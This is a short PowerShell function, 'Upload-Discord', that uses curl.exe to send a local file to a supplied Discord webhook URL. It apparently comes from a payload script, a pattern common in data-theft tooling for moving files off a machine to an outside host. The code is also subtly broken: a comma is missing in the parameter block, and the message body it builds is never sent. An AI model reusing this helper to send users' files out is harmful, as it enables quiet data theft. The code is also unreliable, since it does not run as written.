function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text
    [parameter(Position=2,Mandatory=$False)]
    [string]$hookurl 
)

$Body = @{
  'username' = "bad name"
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
